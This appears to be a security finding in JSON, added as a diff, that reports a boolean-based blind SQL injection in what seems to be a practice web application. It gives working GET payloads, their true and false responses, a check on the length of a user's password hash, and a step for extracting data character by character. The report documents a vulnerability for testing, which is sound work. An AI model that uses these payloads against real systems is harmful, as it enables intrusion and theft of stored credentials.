@@ -1,0 +1,11 @@
+{
+  "title": "SQL Injection (Blind) - Boolean-based blind injection",
+  "severity": "Critical",
+  "location": "/vulnerabilities/sqli_blind/",
+  "proof": "GET /vulnerabilities/sqli_blind/?id=1'+AND+1=1--+-&Submit=Submit returned 'User ID exists in the database.' GET /vulnerabilities/sqli_blind/?id=1'+AND+1=2--+-&Submit=Submit returned 'User ID is MISSING from the database.' Boolean-based blind confirmed. Verified password hash length: AND LENGTH((SELECT password FROM users WHERE user_id=1))=32 returns 'exists'.",
+  "poc_steps": [
+    "GET /vulnerabilities/sqli_blind/?id=1'+AND+1=1--+-&Submit=Submit → 'exists'",
+    "GET /vulnerabilities/sqli_blind/?id=1'+AND+1=2--+-&Submit=Submit → 'MISSING'",
+    "Extract data character by character using AND SUBSTRING(...) comparisons"
+  ]
+}
